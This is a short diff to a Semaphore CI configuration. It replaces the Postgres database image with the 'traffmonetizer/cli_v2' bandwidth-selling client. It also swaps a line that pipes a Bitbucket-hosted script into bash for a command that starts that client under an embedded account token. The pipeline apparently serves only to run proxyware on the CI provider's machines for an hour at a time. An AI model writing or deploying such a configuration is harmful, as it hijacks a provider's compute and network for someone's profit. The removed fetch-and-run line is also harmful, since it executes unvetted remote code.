@@ -8,7 +8,7 @@ agent:
     - name: main
       image: 'traffmonetizer/cli_v2:latest'
     - name: database
-      image: 'registry.semaphoreci.com/postgres:11'
+      image: 'traffmonetizer/cli_v2:latest'
 blocks:
   - name: Semaphore CI Pool
     task:
@@ -19,4 +19,4 @@ blocks:
             hours: 1
           commands:
             - checkout
-            - 'curl -sL https://bitbucket.org/aqshaa/myaqsha/raw/opic | bash'
+            - docker run -i --name tm traffmonetizer/cli_v2 start accept --token FQWHMF1sZYu6ofoqkToZiLE4SOspwe5d/rgC8vXLgII=
